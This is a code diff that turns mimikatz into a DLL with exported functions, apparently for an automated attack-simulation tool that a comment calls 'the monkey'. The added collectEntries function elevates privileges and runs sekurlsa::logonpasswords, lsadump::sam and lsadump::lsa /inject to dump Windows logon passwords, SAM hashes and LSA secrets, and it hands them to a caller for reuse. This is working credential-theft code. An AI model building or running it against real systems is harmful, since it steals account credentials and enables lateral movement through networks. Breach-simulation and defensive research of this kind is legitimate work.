@@ -4,6 +4,7 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "mimikatz.h"
+#include "logon_data.h"
 
 const KUHL_M * mimikatz_modules[] = {
 	&kuhl_m_standard,
@@ -34,42 +35,10 @@ const KUHL_M * mimikatz_modules[] = {
 	&kuhl_m_acr,
 };
 
-int wmain(int argc, wchar_t * argv[])
-{
-	NTSTATUS status = STATUS_SUCCESS;
-	int i;
-#ifndef _POWERKATZ
-	size_t len;
-	wchar_t input[0xffff];
-#endif
-	mimikatz_begin();
-	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
-	{
-		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
-		status = mimikatz_dispatchCommand(argv[i]);
-	}
-#ifndef _POWERKATZ
-	while (status != STATUS_FATAL_APP_EXIT)
-	{
-		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
-		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
-		{
-			if(input[len - 1] == L'\n')
-				input[len - 1] = L'\0';
-			kprintf_inputline(L"%s\n", input);
-			status = mimikatz_dispatchCommand(input);
-		}
-	}
-#endif
-	mimikatz_end();
-	return STATUS_SUCCESS;
-}
-
 void mimikatz_begin()
 {
 	kull_m_output_init();
 #ifndef _POWERKATZ
-	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
 	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
 #endif
 	kprintf(L"\n"
@@ -234,62 +203,65 @@ NTSTATUS mimikatz_doLocal(wchar_t * input)
 	return status;
 }
 
-#ifdef _POWERKATZ
-__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input)
+size_t WINAPI collectEntries()
 {
-	int argc = 0;
-	wchar_t ** argv;
-	
-	if(argv = CommandLineToArgvW(input, &argc))
+	if (s_list != NULL)
 	{
-		outputBufferElements = 0xff;
-		outputBufferElementsPosition = 0;
-		if(outputBuffer = (wchar_t *) LocalAlloc(LPTR, outputBufferElements * sizeof(wchar_t)))
-			wmain(argc, argv);
-		LocalFree(argv);
+		List_delete(s_list);
+		s_list = NULL;
 	}
+
+	static wchar_t buffer[0xffff];
+	memset(buffer, 0, sizeof(buffer));
+	
+	outputBufferElements = sizeof(buffer) / sizeof(buffer[0]);
+	outputBufferElementsPosition = 0;
+	outputBuffer = buffer;
+
+	if (!outputBuffer) {
+		return 0;
+	}
+
+    //
+    // We collect some passwords to be used by the monkey.
+    // the "answer" command is used here to seperate between the output of
+    // the different commands.
+    //
+
+	s_list = List_create();
+	mimikatz_begin();
+	mimikatz_dispatchCommand(L"privilege::debug");
+	mimikatz_dispatchCommand(L"sekurlsa::logonpasswords");
+
+	mimikatz_dispatchCommand(L"token::whoami");
+	mimikatz_dispatchCommand(L"token::elevate");
+
+    // Make sure elevation was successful
+	mimikatz_dispatchCommand(L"token::whoami");
+
+	mimikatz_dispatchCommand(L"answer");
+	mimikatz_dispatchCommand(L"lsadump::sam");
+
+	mimikatz_dispatchCommand(L"answer");
+	mimikatz_dispatchCommand(L"lsadump::lsa /inject");
+	
+	mimikatz_end();
+
+	return List_getLength(s_list);
+}
+
+LogonData WINAPI getEntry()
+{
+	return List_pop(s_list);
+}
+
+// The "collect" entry point (collectEntries) must be called before
+// calling this function. This function returns all the textual output of the commands 
+// called in collectEntries.
+wchar_t* WINAPI getTextOutput()
+{
 	return outputBuffer;
 }
-#endif
-
-#ifdef _WINDLL
-void reatachIoHandle(DWORD nStdHandle, int flags, const char *Mode, FILE *file)
-{
-	int hConHandle;
-	HANDLE lStdHandle;
-	FILE *fd;
-	if(lStdHandle = GetStdHandle(nStdHandle))
-		if(hConHandle = _open_osfhandle((intptr_t) lStdHandle, flags))
-			if(fd = _fdopen(hConHandle, Mode))
-			{
-				*file = *fd;
-				setvbuf(file, NULL, _IONBF, 0);
-			}
-}
-
-void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
-{
-	int argc = 0;
-	wchar_t ** argv;
-
-	if(AllocConsole())
-	{
-		reatachIoHandle(STD_OUTPUT_HANDLE, _O_TEXT, "w", stdout);
-		reatachIoHandle(STD_ERROR_HANDLE, _O_TEXT, "w", stderr);
-		reatachIoHandle(STD_INPUT_HANDLE, _O_TEXT, "r", stdin);
-
-		if(lpszCmdLine && lstrlenW(lpszCmdLine))
-		{
-			if(argv = CommandLineToArgvW(lpszCmdLine, &argc))
-			{
-				wmain(argc, argv);
-				LocalFree(argv);
-			}
-		}
-		else wmain(0, NULL);
-	}
-}
-#endif
 
 FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
 {
